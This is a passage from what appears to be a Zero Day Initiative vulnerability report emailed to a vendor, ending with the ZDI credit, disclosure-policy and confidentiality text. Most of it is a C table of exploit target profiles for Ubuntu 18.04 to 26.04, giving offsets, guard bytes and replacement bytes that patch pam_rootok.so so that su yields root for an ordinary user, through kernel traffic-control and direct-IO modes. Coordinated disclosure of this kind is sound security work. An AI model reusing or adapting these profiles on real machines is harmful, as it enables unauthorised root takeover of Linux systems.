ion.
   */
  [15] =3D {
    .profile_id =3D "ubuntu1804-stock-media",
    .evidence_aliases =3D "ubuntu1804-server-stock-media,ubuntu1804-deskt=
op-stock-media",
    .kernel_releases =3D "4.15.0-213-generic,5.4.0-84-generic,5.4.0-150-g=
eneric",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "18.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.1.8-3.6ubuntu2.18.04.3,1.1.8-3.6ubuntu2.18.0=
4.6",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "90049ddee5062fe4c95910c130de134bd57a9153",
    .baseline_sha256 =3D "5ecaeceb21b9f5f6f6661013b2e35151e19e1f0fe115273=
bf481928c7906895d",
    .mutated_sha256 =3D "1049a7091887e4b8380e0b93e457695a2b6a833a501bbd2e=
1f1be0bb7a44b726",
    .backing_page_sha256 =3D "a8d3bb20978bbd3565a0799b7978d3c6132d60a3b35=
535f55c342f500bb7dd73",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pty_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "bionic",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 88,
    .target_size =3D UINT64_C(0x2840), .target_offset =3D UINT64_C(0xca0)=
,
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0xff, 0xff, 0xeb, 0xc9, 0xe8, 0x17, 0xfd, 0xff, 0xff, 0x0f, 0x1f, 0=
x80, 0x00, 0x00, 0x00, 0x00
    }, .original_slice =3D {
      0x41, 0x56, 0x41, 0x55, 0x49, 0x89, 0xfd, 0x41
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x54, 0x55, 0x53, 0x48, 0x83, 0xec, 0x10, 0x64, 0x48, 0x8b, 0x04, 0=
x25, 0x28, 0x00, 0x00, 0x00
    },
    .success_message =3D "run command su",
#include "generated/ubuntu1804-stock-arrays.inc"
  },
  [16] =3D {
    .profile_id =3D "ubuntu2004-stock-media",
    .evidence_aliases =3D "ubuntu2004-server-stock-media,ubuntu2004-deskt=
op-stock-media",
    .kernel_releases =3D "5.4.0-144-generic,5.15.0-67-generic,5.15.0-139-=
generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "20.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.3.1-5ubuntu4.6",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "f90dd186141734dd4d6a1641d567a2df0f606469",
    .baseline_sha256 =3D "aa21410373f6d06c5524e96777c8ae8d98186699458ba28=
c87e950980419480c",
    .mutated_sha256 =3D "dd5d5cb3d91d51b114ed051f51bc10ccfb3bfe72ceebb424=
aba47d7b572cac59",
    .backing_page_sha256 =3D "11603ffe12b0f1f7c0ddb9e981ea2f513b1fef1a28c=
4ab79899736efbf951217",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "focal",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 88,
    .target_size =3D UINT64_C(0x38d8), .target_offset =3D UINT64_C(0x1440=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0xff, 0x66, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0=
x00, 0x0f, 0x1f, 0x40, 0x00
    }, .original_slice =3D {
      0xf3, 0x0f, 0x1e, 0xfa, 0x41, 0x56, 0x41, 0x55
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x41, 0x54, 0x55, 0x48, 0x89, 0xfd, 0x53, 0x48, 0x83, 0xec, 0x10, 0=
x64, 0x48, 0x8b, 0x04, 0x25
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2004-hwe515-arrays.inc"
  },
  [17] =3D {
    .profile_id =3D "ubuntu2204-stock-server-ga515",
    .evidence_aliases =3D "ubuntu2204-server-stock-media",
    .kernel_releases =3D "5.15.0-119-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "22.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.4.0-11ubuntu2.4",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "fe074e6139664c2a806acadb96dccbfa05108bda",
    .baseline_sha256 =3D "569d371ff1ca4d244920c9e9ed57e827108ffa3f4525d2c=
e95de8b4ede8f67b5",
    .mutated_sha256 =3D "ab99131f6350cdaebcd8b04d69b29ce0a16bfe22c2567ba6=
4a829fcbef1ecae3",
    .backing_page_sha256 =3D "5d7e16958849c78bb9164ecbe0513b1a39f7727c1c8=
ed608a686e7a074c9dc80",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "embedded_u32",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "jammy",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 88,
    .target_size =3D UINT64_C(0x37f8), .target_offset =3D UINT64_C(0x1584=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 0,
    .guard_before =3D {
      0xe8, 0xf7, 0xfb, 0xff, 0xff, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0=
x00, 0xf3, 0x0f, 0x1e, 0xfa
    }, .original_slice =3D {
      0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xfe, 0x41
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x55, 0x41, 0x54, 0x55, 0x53, 0x48, 0x83, 0xec, 0x08, 0x85, 0xd2, 0=
x7e, 0x77, 0x48, 0x63, 0xd2
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2204-stock-ga-arrays.inc"
  },
  [18] =3D {
    .profile_id =3D "ubuntu2204-stock-desktop-hwe68",
    .evidence_aliases =3D "ubuntu2204-desktop-stock-media",
    .kernel_releases =3D "6.8.0-40-generic,6.8.0-136-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "22.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.4.0-11ubuntu2.4",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "fe074e6139664c2a806acadb96dccbfa05108bda",
    .baseline_sha256 =3D "569d371ff1ca4d244920c9e9ed57e827108ffa3f4525d2c=
e95de8b4ede8f67b5",
    .mutated_sha256 =3D "ab99131f6350cdaebcd8b04d69b29ce0a16bfe22c2567ba6=
4a829fcbef1ecae3",
    .backing_page_sha256 =3D "5d7e16958849c78bb9164ecbe0513b1a39f7727c1c8=
ed608a686e7a074c9dc80",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "jammy",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x37f8), .target_offset =3D UINT64_C(0x1584=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0xe8, 0xf7, 0xfb, 0xff, 0xff, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0=
x00, 0xf3, 0x0f, 0x1e, 0xfa
    }, .original_slice =3D {
      0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xfe, 0x41
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x55, 0x41, 0x54, 0x55, 0x53, 0x48, 0x83, 0xec, 0x08, 0x85, 0xd2, 0=
x7e, 0x77, 0x48, 0x63, 0xd2
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2204-stock-hwe-arrays.inc"
  },
  [19] =3D {
    .profile_id =3D "ubuntu2404-stock-server-ga68",
    .evidence_aliases =3D "ubuntu2404-server-stock-media",
    .kernel_releases =3D "6.8.0-100-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "24.04",
    .package_name =3D "libpam-modules:amd64",
    .package_versions =3D "1.5.3-5ubuntu5.5",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "apparmor:unconfined",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "87f6370e110e3020d23c1f7ee064600dd8672680",
    .baseline_sha256 =3D "48ebc2d5eeb3b3d90a6a8bd02e95dbba6272e8ce2cd3408=
8d5aa8a71d613db34",
    .mutated_sha256 =3D "7b0654d74aa7f5fc072f415292b9e27ca344c6a55ed88c05=
5c85c0b5faea6da7",
    .backing_page_sha256 =3D "f8105e4c077570c1e482783056b360d8ce31d3ff979=
e5ffc4faa5f54ea2d2989",
    .package_query =3D "dpkg",
    .execution_mode =3D "ubuntu_optional_launcher",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,mm=
debstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,li=
bcamerify,runc,crun,sbuild",
    .automatic_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,=
mmdebstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,=
libcamerify",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "noble",
    .allowed_supplementary_groups =3D "100",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3898), .target_offset =3D UINT64_C(0x1486=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 0,
    .guard_before =3D {
      0x10, 0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0=
x89, 0x45, 0xd8, 0x31, 0xc0
    }, .original_slice =3D {
      0xe8, 0xf5, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x51, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x6b, 0x0b, 0x00
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2404-stock-arrays.inc"
  },
  [20] =3D {
    .profile_id =3D "ubuntu2404-stock-desktop-hwe617",
    .evidence_aliases =3D "ubuntu2404-desktop-stock-media",
    .kernel_releases =3D "6.17.0-14-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "24.04",
    .package_name =3D "libpam-modules:amd64",
    .package_versions =3D "1.5.3-5ubuntu5.5",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "apparmor:unconfined",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "87f6370e110e3020d23c1f7ee064600dd8672680",
    .baseline_sha256 =3D "48ebc2d5eeb3b3d90a6a8bd02e95dbba6272e8ce2cd3408=
8d5aa8a71d613db34",
    .mutated_sha256 =3D "7b0654d74aa7f5fc072f415292b9e27ca344c6a55ed88c05=
5c85c0b5faea6da7",
    .backing_page_sha256 =3D "f8105e4c077570c1e482783056b360d8ce31d3ff979=
e5ffc4faa5f54ea2d2989",
    .package_query =3D "dpkg",
    .execution_mode =3D "ubuntu_optional_launcher",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,mm=
debstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,li=
bcamerify,runc,crun,sbuild",
    .automatic_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,=
mmdebstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,=
libcamerify",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "noble",
    .allowed_supplementary_groups =3D "100",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3898), .target_offset =3D UINT64_C(0x1486=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 0,
    .guard_before =3D {
      0x10, 0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0=
x89, 0x45, 0xd8, 0x31, 0xc0
    }, .original_slice =3D {
      0xe8, 0xf5, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x51, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x6b, 0x0b, 0x00
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2404-stock-arrays.inc"
  },
  [21] =3D {
    .profile_id =3D "ubuntu2604-stock-media",
    .evidence_aliases =3D "ubuntu2604-server-stock-media,ubuntu2604-deskt=
op-stock-media",
    .kernel_releases =3D "7.0.0-14-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "26.04",
    .package_name =3D "libpam-modules:amd64",
    .package_versions =3D "1.7.0-5ubuntu3",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "apparmor:unconfined",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "5b7d4bfa66abb285633f9d39458117bac1b96f60",
    .baseline_sha256 =3D "532a7ab99c6feae9fb78229bb4cdf7d95f250b23d0f4ffc=
1bed43bb532af8d23",
    .mutated_sha256 =3D "02525e43194708dc5728a1b25b9749aca850eba4f3e5b8bf=
d70de1f45e7b7d25",
    .backing_page_sha256 =3D "0d4a666671377c4b2ac24956c7f7eea612e7e56cbe2=
e385fd5e735b5ca346c13",
    .package_query =3D "dpkg",
    .execution_mode =3D "ubuntu_optional_launcher",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,mm=
debstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,li=
bcamerify,runc,crun,sbuild",
    .automatic_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,=
mmdebstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,=
libcamerify",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "resolute",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x38e8), .target_offset =3D UINT64_C(0x148f=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 0,
    .guard_before =3D {
      0x28, 0x64, 0x48, 0x8b, 0x1c, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0=
x89, 0x5d, 0xd8, 0x89, 0xf3
    }, .original_slice =3D {
      0xe8, 0xec, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x48, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x62, 0x0b, 0x00
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2604-stock-arrays.inc"
  },
  [22] =3D {
    .profile_id =3D "ubuntu2204-ga515-u27",
    .evidence_aliases =3D "ubuntu2204-server-ga515-pam-u27",
    .kernel_releases =3D "5.15.0-186-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "22.04",
    .package_name =3D "libpam-modules",
    .package_versions =3D "1.4.0-11ubuntu2.7",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "none",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "60327f56aabe6e65e9c2b4462ee230230cbf5a85",
    .baseline_sha256 =3D "05f28aca713b40f35724577bdf1d460d68bfe6fbc101252=
9e93163fa3f7de60c",
    .mutated_sha256 =3D "1e1e5156d7e1302bbaab3da8a4232763bbea4379f259ff25=
c9d84bfa1b006f97",
    .backing_page_sha256 =3D "5d7e16958849c78bb9164ecbe0513b1a39f7727c1c8=
ed608a686e7a074c9dc80",
    .package_query =3D "dpkg",
    .execution_mode =3D "direct_unshare",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "",
    .automatic_launchers =3D "",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "jammy",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 88,
    .target_size =3D UINT64_C(0x37f8), .target_offset =3D UINT64_C(0x1584=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0xe8, 0xf7, 0xfb, 0xff, 0xff, 0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0=
x00, 0xf3, 0x0f, 0x1e, 0xfa
    }, .original_slice =3D {
      0x41, 0x57, 0x41, 0x56, 0x49, 0x89, 0xfe, 0x41
    }, .desired_slice =3D {
      0x31, 0xc0, 0xc3, 0x90, 0x90, 0x90, 0x90, 0x90
    }, .guard_after =3D {
      0x55, 0x41, 0x54, 0x55, 0x53, 0x48, 0x83, 0xec, 0x08, 0x85, 0xd2, 0=
x7e, 0x77, 0x48, 0x63, 0xd2
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2204-stock-ga-arrays.inc"
  },
  [23] =3D {
    .profile_id =3D "ubuntu2404-ga68-u56-k6136",
    .evidence_aliases =3D "ubuntu2404-server-live-k6136-pam-u56,ubuntu240=
4-desktop-live-k7028-pam-u56",
    .kernel_releases =3D "6.8.0-136-generic,7.0.0-28-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "24.04",
    .package_name =3D "libpam-modules:amd64",
    .package_versions =3D "1.5.3-5ubuntu5.6",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "apparmor:unconfined",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "4261a0cc79cc74b0d3ac69a15e032203e6e85078",
    .baseline_sha256 =3D "6bbaa2e203c49dcf034964e3f9f3221b8176589dfb6265d=
a8ca726bd11119b95",
    .mutated_sha256 =3D "f5e10da9e823e59b8412446183c8ca13eaed9f9e774e3562=
490004b23a6f85f7",
    .backing_page_sha256 =3D "f8105e4c077570c1e482783056b360d8ce31d3ff979=
e5ffc4faa5f54ea2d2989",
    .package_query =3D "dpkg",
    .execution_mode =3D "ubuntu_optional_launcher",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,mm=
debstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,li=
bcamerify,runc,crun,sbuild",
    .automatic_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,=
mmdebstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,=
libcamerify",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "noble",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x3898), .target_offset =3D UINT64_C(0x1486=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x10, 0x64, 0x48, 0x8b, 0x04, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0=
x89, 0x45, 0xd8, 0x31, 0xc0
    }, .original_slice =3D {
      0xe8, 0xf5, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x51, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x6b, 0x0b, 0x00
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2404-stock-arrays.inc"
  },
  [24] =3D {
    .profile_id =3D "ubuntu2604-u31-k7028",
    .evidence_aliases =3D "ubuntu2604-server-live-k7028-pam-u31,ubuntu260=
4-desktop-live-k7028-pam-u31",
    .kernel_releases =3D "7.0.0-28-generic",
    .distribution_id =3D "ubuntu",
    .distribution_version =3D "26.04",
    .package_name =3D "libpam-modules:amd64",
    .package_versions =3D "1.7.0-5ubuntu3.1",
    .filesystem =3D "ext4",
    .lsm_constraint =3D "apparmor:unconfined",
    .target_path =3D "/usr/lib/x86_64-linux-gnu/security/pam_rootok.so",
    .target_build_id =3D "62c63ee37c072ae156539ce269713f8ad1683b11",
    .baseline_sha256 =3D "9098a1cfc0260466023fed3a70e77bc0941058c6bc917c4=
8c609f02aeeed5ac0",
    .mutated_sha256 =3D "98f635edb561b2a3b522a1018a3ff4b92e873600d3667859=
d020c43c419d2767",
    .backing_page_sha256 =3D "0d4a666671377c4b2ac24956c7f7eea612e7e56cbe2=
e385fd5e735b5ca346c13",
    .package_query =3D "dpkg",
    .execution_mode =3D "ubuntu_optional_launcher",
    .tc_mode =3D "matchall_pedit",
    .consumer_mode =3D "pipe_su",
    .direct_io_mode =3D "ext4_direct",
    .recovery_mode =3D "snapshot_rollback",
    .allowed_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,mm=
debstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,li=
bcamerify,runc,crun,sbuild",
    .automatic_launchers =3D "podman,buildah,rootlesskit,opam,tup,ch-run,=
mmdebstrap,lxc-usernsexec,vdens,vpnns,userbindmount,rpm,bazel,uwsgi-core,=
libcamerify",
    .recovery_artifact =3D "",
    .recovery_sha256 =3D "",
    .distribution_suite =3D "resolute",
    .allowed_supplementary_groups =3D "",
    .expected_uid =3D 1000, .expected_gid =3D 1000,
    .target_uid =3D 0, .target_gid =3D 0,
    .target_mode =3D 0644, .tc_frame_length =3D 96,
    .target_size =3D UINT64_C(0x38e8), .target_offset =3D UINT64_C(0x148f=
),
    .flexible_identity =3D 1, .check_supplementary_groups =3D 1, .enabled=
 =3D 1,
    .guard_before =3D {
      0x28, 0x64, 0x48, 0x8b, 0x1c, 0x25, 0x28, 0x00, 0x00, 0x00, 0x48, 0=
x89, 0x5d, 0xd8, 0x89, 0xf3
    }, .original_slice =3D {
      0xe8, 0xec, 0xfc, 0xff, 0xff, 0x85, 0xc0, 0x74
    }, .desired_slice =3D {
      0x31, 0xc0, 0x90, 0x90, 0x90, 0x85, 0xc0, 0x74
    }, .guard_after =3D {
      0x48, 0x85, 0xdb, 0xbb, 0x07, 0x00, 0x00, 0x00, 0x74, 0x1d, 0x48, 0=
x8d, 0x0d, 0x62, 0x0b, 0x00
    },
    .success_message =3D "run command su",
#include "generated/ubuntu2604-stock-arrays.inc"
  },
};
const size_t compiled_profile_count =3D PROFILE_COUNT;

~~~



-- CREDIT ---------------------------------------
This vulnerability was discovered by:
p1r0x working with TrendAI Zero Day Initiative

-- FURTHER DETAILS ------------------------------

Supporting files:


If supporting files were contained with this report they are provided wit=
hin a password protected ZIP file. The password is the ZDI candidate numb=
er in the form: ZDI-CAN-XXXX where XXXX is the ID number.

Please confirm receipt of this report. We expect all vendors to remediate=
 ZDI vulnerabilities within 120 days of the reported date. If you are rea=
dy to release a patch at any point leading up to the deadline, please coo=
rdinate with us so that we may release our advisory detailing the issue. =
If the 120-day deadline is reached and no patch has been made available w=
e will release a limited public advisory with our own mitigations, so tha=
t the public can protect themselves in the absence of a patch. Please kee=
p us updated regarding the status of this issue and feel free to contact =
us at any time:

Zero Day Initiative
zdi-disclosures@trendmicro.com

The PGP key used for all ZDI vendor communications is available from:

  http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc

-- INFORMATION ABOUT THE ZDI --------------------
Established by TippingPoint and acquired by Trend Micro, the Zero Day Ini=
tiative (ZDI) neither re-sells vulnerability details nor exploit code. In=
stead, upon notifying the affected product vendor, the ZDI provides its T=
rend Micro TippingPoint customers with zero day protection through its in=
trusion prevention technology. Explicit details regarding the specifics o=
f the vulnerability are not exposed to any parties until an official vend=
or patch is publicly available.

Please contact us for further details or refer to:

  http://www.zerodayinitiative.com

-- DISCLOSURE POLICY ----------------------------

Our vulnerability disclosure policy is available online at:

  http://www.zerodayinitiative.com/advisories/disclosure_policy/
    
TREND MICRO EMAIL NOTICE
The information contained in this email and any attachments is confidenti=
al
and may be subject to copyright or other intellectual property protection=
.
If you are not the intended recipient, you are not authorized to use or
disclose this information, and we request that you notify us by reply mai=
l or
telephone and delete the original message from your mail system.
For details about what personal information we collect and why, please se=
e our Privacy Notice on our website at: [ https://www.trendmicro.com/priv=
acy]

